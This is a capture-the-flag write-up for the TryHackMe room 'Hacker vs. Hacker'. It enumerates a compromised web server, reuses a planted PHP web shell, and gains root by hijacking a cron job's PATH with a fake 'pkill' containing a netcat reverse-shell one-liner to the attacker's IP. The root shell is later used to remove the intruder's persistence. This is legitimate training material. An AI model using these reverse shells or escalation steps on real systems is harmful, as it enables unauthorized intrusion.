<p align="center">
  THM : Hacker vs. Hacker<br>
  Difficulty : Easy<br>
  Room link : https://tryhackme.com/room/hackervshacker<br>
  <img src="https://i.imgur.com/FvubZHr.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Website enumeration](#website-enumeration)
- [Get a shell](#get-a-shell)
- [Privilege escalation](#privilege-escalation)
- [Fix the machine](#fix-the-machine)
- [Conclusion](#conclusion)

## Nmap scan

Like always, let's begin with an agressive [nmap](https://nmap.org/) scan to find out what ports are open on the target :  
```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-17 19:13 CEST
Nmap scan report for 10.10.36.91
Host is up (0.083s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.48 seconds
```

So there is only two open ports : 
- port 80, there is a webserver running on the target
- port 22 (ssh)

## Website enumeration

### Summary

- [Gobuster enumeration](#gobuster-enumeration)
- [Manual enumeration](#manual-enumeration)

### Gobuster enumeration

We can use [Gobuster](https://github.com/OJ/gobuster) to try to find interesting files and directories on the website :  
```
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.36.91/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.1
[+] Timeout:                 10s
===============================================================
2022/10/17 19:17:20 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.36.91/images/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.36.91/css/]
/cvs                  (Status: 301) [Size: 308] [--> http://10.10.36.91/cvs/]
/dist                 (Status: 301) [Size: 309] [--> http://10.10.36.91/dist/]
/server-status        (Status: 403) [Size: 276]
Progress: 220472 / 220561 (99.96%)
===============================================================
2022/10/17 19:30:02 Finished
===============================================================
```

### Manual enumeration

Let's take a look at the index page of the website. If you go down the page, you will notice we can upload a CV in .pdf format :  
![](https://i.imgur.com/3HjJ7bY.jpg)  

We can try to upload a reverse shell using this upload form, and if there is filters, we can try to bypass them. Let's try to upload a random pdf file to see what happen :  
![](https://i.imgur.com/CGPdIRD.jpg)  

The hacker already found a vulnerability here. He left a message that tells us that the uploaded files are not properly filtered. If we look at the source code of the page, the hacker left 
the php code in a comment tag :  
![](https://i.imgur.com/WW7kD6e.jpg)  

If we go to "/cvs/sample.pdf" (sample.pdf is the name of the pdf I uploaded), we see get an error 404 not found. It seems that the hacker broke the upload page and it is not working 
anymore... But we can try something else. Remember, in his message, the hacker is telling that he was able to upload a shell. Maybe we can find his shell and use it. Let's make a simple 
wordlist containing possible file names for php shells :  
```
attacker@AttackBox:~/Documents/THM/CTF/Hacker_vs_Hacker$ cat shell_wordlist.txt 
shell.php
reverse-shell.php
php-reverse-shell.php
php-shell.php
```
We can now use [Gobuster](https://github.com/OJ/gobuster) and scan the "/cvs" directory and try to find the hacker's php shell with this small wordlist :  
```
attacker@AttackBox:~/Documents/THM/CTF/Hacker_vs_Hacker$ gobuster dir -u http://10.10.36.91/cvs/ -w shell_wordlist.txt 
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.36.91/cvs/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                shell_wordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.1
[+] Timeout:                 10s
===============================================================
2022/10/17 19:41:30 Starting gobuster in directory enumeration mode
===============================================================
===============================================================
2022/10/17 19:41:30 Finished
===============================================================
```

We did not find any page... We need to edit our wordlist. Since the upload filter check if the file contains ".pdf", we can try to add ".pdf" on each lines of the wordlist :  
```
attacker@AttackBox:~/Documents/THM/CTF/Hacker_vs_Hacker$ cat shell_wordlist.txt 
shell.pdf.php
reverse-shell.pdf.php
php-reverse-shell.pdf.php
php-shell.pdf.php
```

Let's try again with [Gobuster](https://github.com/OJ/gobuster) :  
```
attacker@AttackBox:~/Documents/THM/CTF/Hacker_vs_Hacker$ gobuster dir -u http://10.10.36.91/cvs/ -w shell_wordlist.txt 
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.36.91/cvs/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                shell_wordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.1
[+] Timeout:                 10s
===============================================================
2022/10/17 19:45:06 Starting gobuster in directory enumeration mode
===============================================================
/shell.pdf.php        (Status: 200) [Size: 18]
===============================================================
2022/10/17 19:45:06 Finished
===============================================================
```

We found the hacker's php shell ! Let's take a look at it using a web browser :  
![](https://i.imgur.com/GtbvZz0.jpg)  

There is only a useless text "boom!", maybe we can try to add a parameter in the url, like "?cmd=ls", it's a common parameter used in most web shells:  
![](https://i.imgur.com/9b1Cxln.jpg)  

It works. 

## Get a shell

Now we know how to use it, we just have to get a reverse shell now (this php shell is not a reverse shell, it's a web shell and it's not as convenient as a reverse shell). 
So I used [revshells.com](https://www.revshells.com/) to generate a python3 reverse shell (since python3 is installed on almost any linux hosts), then I used 
[urlencoder.org](https://www.urlencoder.org/) to url encode the payload. Now I can setup a netcat listener on port 4242, and put this url encoded payload in the "cmd" parameter in 
the url and see if I get a reverse shell :  
```
attacker@AttackBox:~/Documents/THM/CTF/Hacker_vs_Hacker$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.14.32.60] from (UNKNOWN) [10.10.36.91] 60198
$ nope
```

This hacker is a funny guy... Let's try with another reverse shell (not with python3, a netcat reverse shell this time) :  
```
attacker@AttackBox:~/Documents/THM/CTF/Hacker_vs_Hacker$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.14.32.60] from (UNKNOWN) [10.10.36.91] 60202
sh: 0: can't access tty; job control turned off
$
```

We have a reverse shell ! Let's get the user.txt flag :  
```
$ cd /home
$ ls
lachlan
$ ls -la
total 12
drwxr-xr-x  3 root    root    4096 May  5 04:38 .
drwxr-xr-x 19 root    root    4096 May  5 03:46 ..
drwxr-xr-x  4 lachlan lachlan 4096 May  5 04:39 lachlan
$ cd lachlan
$ ls
bin
user.txt
$ cat user.txt
thm{********************************}
$
```

## Privilege escalation

Let's see what's inside .bash_history in /home/lachlan :  
```
$ cat .bash_history
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
$
```

We can see that the password for user lachlan was changed from "dHY5pzmNYoETv7SUaY" to "thisistheway123". So we have a password, let's try to login as lachlan :  
```
$ su lachlan
Password: thisistheway123
whoami
lachlan
```

We are now logged in as lachlan. Let's continue enumerating the machine. If we take a look at "/etc/cron.d" directory, we can see a file named "persistence". Let's check what's inside :  
```
cd /etc/cron.d
ls
e2scrub_all
persistence
php
popularity-contest
ls
e2scrub_all
persistence
php
popularity-contest
cat persistence
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```

There is cron jobs that kills every pseudo terminals... That's why our shell was instantly getting killed when we tried to get an interactive reverse shell with python3. You can notice in 
the PATH variable "/home/lachlan/bin", it's a directory where we have write permissions. You can also notice that the hacker did not use the full path for "pkill", so if we write our own 
"pkill" file in "/home/lachlan/bin", the cron job will use this one since it's the first directory where it will look for the binary "pkill". In addition, this cron job is running as root.  

Let's create our own "pkill" file in "/home/lachlan/bin" directory, containing a reverse shell (I will use the same reverse shell as earlier with the cmd url parameter):  
```
cd /home/lachlan/bin
echo '#!/bin/bash' > pkill            
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.32.60 4243 >/tmp/f' >> pkill
chmod +x pkill
cat pkill
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.32.60 4243 >/tmp/f
```

Now, let's setup a netcat listener on port 4243 and wait for a connection :  
```
attacker@AttackBox:~/Documents/THM/CTF/Hacker_vs_Hacker$ nc -lnvp 4243
listening on [any] 4243 ...
connect to [10.14.32.60] from (UNKNOWN) [10.10.36.91] 50818
sh: 0: can't access tty; job control turned off
# whoami
root
#
```

We are root !

Let's get the root flag now :  
```
# cd /root
# ls
root.txt
snap
# cat root.txt
thm{****************************}
# 
```

## Fix the machine

Like asked in the statement of the room, we need to fix the machine. First, let's put our SSH public key in /root/.ssh/authorized_keys file, so we can reconnect to the machine at any time 
we want :  
I generate SSH keys on my local machine :  
```
attacker@AttackBox:~/Documents/THM/CTF/Hacker_vs_Hacker$ ssh-keygen -f root_rsa
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in root_rsa
Your public key has been saved in root_rsa.pub
The key fingerprint is:
SHA256:CPzt7h117XELe8Vx4L9frkQzEO/7xk2HlLK/KQDD16o attacker@AttackBox
The key's randomart image is:
+---[RSA 3072]----+
|            . .  |
|   .         + . |
|    o  .   .. oo.|
|     o o+ . ooo+o|
|      o S+ ..=*o*|
|       .  o..o+=O|
|        .... oo*=|
|       .E. ...o+*|
|       .o .  .+++|
+----[SHA256]-----+
attacker@AttackBox:~/Documents/THM/CTF/Hacker_vs_Hacker$ cat root_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOjJrcc4rRdBwv3UUF9l4Q4Rox8HvbDgG9gIOxd4xnccnTASJA3r96QeZQwrZShksVuw0e+rE/vjd63W4tLvZJlsSZSgQEdMOUxab+HlYXfO8kqoyy1fZ2x0s2AUBUObkB0qV3rw9nyounBeCiA3RRZUwaRM5aeoGiEQeTJQbA1HJnlddtACKKLpfc6WEiCBchmhs8fzMajVk2BEe3N+V/b7aXACXu7mkdaq19x7gkWA0vhbPf+ZpU6mrf/QtY27Y9R5i4FNmMz87pXHDnJfgqH+jFxl+sx7HTP7FfpbpTXq92Zujyd1PXPXW7/yFBCoIj/eOb8UrLUZ+pKBy9hoBsRfIGZWgRHc7m22YPciPGzlZEtdZQGHwzNJBxBDfdI0Xg0MsxtRH0+BodlPgFqlSdzs/YyeylpKYjw6x7eYk60Aj/0VaT+6Ht5pKnvrPRC1DFDvbZYIVva5BAKIR3PUekH2u+jteOWN8y5/dDrMKSLAH/UbL3VS7z/6jPbRCAvb8= attacker@AttackBox
```

Then, we can copy the public ssh key and write it in /root/.ssh/authorized_keys :  
```
# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOjJrcc4rRdBwv3UUF9l4Q4Rox8HvbDgG9gIOxd4xnccnTASJA3r96QeZQwrZShksVuw0e+rE/vjd63W4tLvZJlsSZSgQEdMOUxab+HlYXfO8kqoyy1fZ2x0s2AUBUObkB0qV3rw9nyounBeCiA3RRZUwaRM5aeoGiEQeTJQbA1HJnlddtACKKLpfc6WEiCBchmhs8fzMajVk2BEe3N+V/b7aXACXu7mkdaq19x7gkWA0vhbPf+ZpU6mrf/QtY27Y9R5i4FNmMz87pXHDnJfgqH+jFxl+sx7HTP7FfpbpTXq92Zujyd1PXPXW7/yFBCoIj/eOb8UrLUZ+pKBy9hoBsRfIGZWgRHc7m22YPciPGzlZEtdZQGHwzNJBxBDfdI0Xg0MsxtRH0+BodlPgFqlSdzs/YyeylpKYjw6x7eYk60Aj/0VaT+6Ht5pKnvrPRC1DFDvbZYIVva5BAKIR3PUekH2u+jteOWN8y5/dDrMKSLAH/UbL3VS7z/6jPbRCAvb8= attacker@AttackBox' > authorized_keys
# cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOjJrcc4rRdBwv3UUF9l4Q4Rox8HvbDgG9gIOxd4xnccnTASJA3r96QeZQwrZShksVuw0e+rE/vjd63W4tLvZJlsSZSgQEdMOUxab+HlYXfO8kqoyy1fZ2x0s2AUBUObkB0qV3rw9nyounBeCiA3RRZUwaRM5aeoGiEQeTJQbA1HJnlddtACKKLpfc6WEiCBchmhs8fzMajVk2BEe3N+V/b7aXACXu7mkdaq19x7gkWA0vhbPf+ZpU6mrf/QtY27Y9R5i4FNmMz87pXHDnJfgqH+jFxl+sx7HTP7FfpbpTXq92Zujyd1PXPXW7/yFBCoIj/eOb8UrLUZ+pKBy9hoBsRfIGZWgRHc7m22YPciPGzlZEtdZQGHwzNJBxBDfdI0Xg0MsxtRH0+BodlPgFqlSdzs/YyeylpKYjw6x7eYk60Aj/0VaT+6Ht5pKnvrPRC1DFDvbZYIVva5BAKIR3PUekH2u+jteOWN8y5/dDrMKSLAH/UbL3VS7z/6jPbRCAvb8= attacker@AttackBox
#
```

Before we connect to the machine using ssh, we have to remove the cron jobs that kill any pseudo terminals (in /etc/cron.d/persistence) :  
```
# cd /etc/cron.d
# ls
e2scrub_all
persistence
php
popularity-contest
# rm persistence
# ls
e2scrub_all
php
popularity-contest
#
```

Now, we can connect to the machine using SSH without getting our shell killed :  
```
attacker@AttackBox:~/Documents/THM/CTF/Hacker_vs_Hacker$ ssh root@10.10.36.91 -i root_rsa 
The authenticity of host '10.10.36.91 (10.10.36.91)' can't be established.
ECDSA key fingerprint is SHA256:1JL2Lj4XaQRN1Z9r5+bXLO4sqNT0NssAebebHwtmF/k.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.36.91' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@b2r:~#
```

Now let's change the password of lachlan back to the original (in a real-world scenario, I think it's a bad idea since the hacker may have noted the old password, so we should change it to something else) :  
```
root@b2r:/home/lachlan# su lachlan
$ cat .bash_history
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
$ passwd
Changing password for lachlan.
Current password: 
New password: 
Retype new password: 
passwd: password updated successfully
```

We can also create a symbolic link from .bash_history to /dev/null, so the commands used by lachlan will not be registered in this file anymore (we could also just make it 
readble by lachlan):  
```
root@b2r:/home/lachlan# ln -sf /dev/null .bash_history 
root@b2r:/home/lachlan# ls -la
total 32
drwxr-xr-x 4 lachlan lachlan 4096 Oct 17 20:11 .
drwxr-xr-x 3 root    root    4096 May  5 04:38 ..
lrwxrwxrwx 1 root    root       9 Oct 17 20:11 .bash_history -> /dev/null
-rw-r--r-- 1 lachlan lachlan  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 lachlan lachlan 3771 Feb 25  2020 .bashrc
drwxr-xr-x 2 lachlan lachlan 4096 Oct 17 19:49 bin
drwx------ 2 lachlan lachlan 4096 May  5 04:39 .cache
-rw-r--r-- 1 lachlan lachlan  807 Feb 25  2020 .profile
-rw-r--r-- 1 lachlan lachlan   38 May  5 04:38 user.txt
root@b2r:/home/lachlan#
```

Let's also remove the shell uploaded by the hacker :  
```
root@b2r:/var/www/html/cvs# ls
index.html  shell.pdf.php
root@b2r:/var/www/html/cvs# rm shell.pdf.php
```

We successfully fixed the machine ! (I did not restore the upload.php file since it contains a vulnerability that allows an attacker to upload a shell.

## Conclusion

This room was very cool to do, it was funny to recover a machine that was hacked and to fix it. Thanks for this room ! And thanks for reading me !
